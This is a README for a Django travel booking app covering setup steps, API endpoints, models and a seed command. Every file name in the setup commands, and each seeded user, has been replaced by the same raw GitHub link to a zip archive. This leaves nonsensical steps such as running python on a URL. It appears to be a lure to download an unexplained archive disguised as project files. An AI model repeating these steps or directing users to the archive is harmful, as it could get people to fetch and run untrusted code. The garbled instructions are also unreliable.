# ALX Travel App

## Setup Instructions

1. Clone the repository
2. Create and activate virtual environment
3. Install requirements: `pip install -r https://raw.githubusercontent.com/elnatnael/alx_travel_app_0x00/main/alx_travel_app/x_app_alx_travel_3.2.zip`
4. Run migrations: `python https://raw.githubusercontent.com/elnatnael/alx_travel_app_0x00/main/alx_travel_app/x_app_alx_travel_3.2.zip migrate`
5. Seed database: `python https://raw.githubusercontent.com/elnatnael/alx_travel_app_0x00/main/alx_travel_app/x_app_alx_travel_3.2.zip seed`
6. Run server: `python https://raw.githubusercontent.com/elnatnael/alx_travel_app_0x00/main/alx_travel_app/x_app_alx_travel_3.2.zip runserver`

## API Endpoints

- Listings: `/api/listings/`
- Bookings: `/api/bookings/`
- Reviews: `/api/reviews/`

## Models

- **Listing**: Vacation properties available for booking
- **Booking**: Reservations made by guests
- **Review**: Guest feedback on listings

## Seed Command

Populates database with:
- 1 host user (https://raw.githubusercontent.com/elnatnael/alx_travel_app_0x00/main/alx_travel_app/x_app_alx_travel_3.2.zip)
- 1 guest user (https://raw.githubusercontent.com/elnatnael/alx_travel_app_0x00/main/alx_travel_app/x_app_alx_travel_3.2.zip)
- 10 sample listings